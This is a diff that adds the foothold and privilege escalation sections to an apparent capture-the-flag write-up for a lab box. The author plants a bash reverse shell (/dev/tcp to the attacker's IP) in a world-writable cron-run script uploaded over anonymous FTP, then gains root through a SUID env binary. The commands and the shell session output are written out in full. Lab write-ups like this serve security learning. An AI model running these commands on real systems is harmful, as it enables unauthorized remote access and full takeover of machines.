@@ -205,12 +205,126 @@ smb: \> ls
 smb: \> 
 ```
 
-Since there are no other active pathways available, we have the devil in front of us ... stego.
+Since there are no other active pathways available (other than clean.sh :P), we have the devil in front of us ... stego.
 
-Well well well. Imma brb with some tools.
+~~Well well well. Imma brb with some tools.~~
 
+So, ... I have been trolled. Nothing in images. "My disappointment is immeasurable and my day is ruined".
+
+## Foothold
+Okay. That clean.sh script looked tasty, let's break it down.
+
+```
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+```
+
+Okay. Nothing in here specifically, but the existence of logs tells me that it is being run quite frequently. This means ... its revshell time :D
+
+`sh -i >& /dev/tcp/YO_IP/1337 0>&1`
+
+Since we have all the permissions, its ezpzlmnsqz. Lesgoo
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ ftp 10.10.14.90
+Connected to 10.10.14.90.
+220 NamelessOne's FTP Server!
+Name (10.10.14.90:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
+226 Directory send OK.
+ftp> cd scripts
+250 Directory successfully changed.
+ftp> put clean.sh
+local: clean.sh remote: clean.sh
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+383 bytes sent in 0.00 secs (4.6235 MB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xrwx    1 1000     1000          383 May 07 10:50 clean.sh
+-rw-rw-r--    1 1000     1000         2623 May 07 10:50 removed_files.log
+-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
+226 Directory send OK.
+ftp> 
+```
+
+where the edited script looks like so,
+```
+#!/bin/bash
+
+# hehehehehe yeaaa boiiii
+sh -i >& /dev/tcp/10.8.150.214/1337 0>&1
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+```
+
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ nc -lnvp 1337                    
+listening on [any] 1337 ...
+connect to [10.8.150.214] from (UNKNOWN) [10.10.14.90] 43642
+sh: 0: can't access tty; job control turned off
+$ whoami 
+namelessone
+$ id
+uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+```
+
+NOICE. we are in!
 
 ## PrivEsc
+
+okay. first things first. Let's get a better shell and see what sudo permissions we have. Just do `bash -i`. We get
+
+```
+namelessone@anonymous:~$ sudo -l
+sudo -l
+sudo: no tty present and no askpass program specified
+```
+
+Okay so time to find the setuid bit. Use `namelessone@anonymous:~$ find / -perm -u=s 2>/dev/null`
+
+Looking at [gtfobins](https://gtfobins.github.io/) we find `env` as a possible solution. 
+
+```
+namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
+/usr/bin/env /bin/bash -p
+whoami
+root
+cat /root/root.txt
+{hmmmmmmmmmmmmmmmmm}
+```
+
+We are done!
 
 
 
